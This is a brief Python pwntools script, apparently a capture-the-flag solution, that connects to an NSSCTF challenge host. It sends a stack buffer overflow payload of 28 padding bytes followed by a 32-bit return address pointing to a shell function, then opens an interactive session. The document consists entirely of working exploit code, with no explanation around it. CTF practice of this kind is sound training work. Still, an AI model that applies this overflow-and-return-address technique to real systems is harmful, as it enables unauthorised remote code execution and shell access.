from pwn import *

p=remote('node5.anna.nssctf.cn',25675)
shell_addr=0x0804851B
payload=b'a'*(24+4)+p32(shell_addr)
p.sendline(payload)
p.interactive()
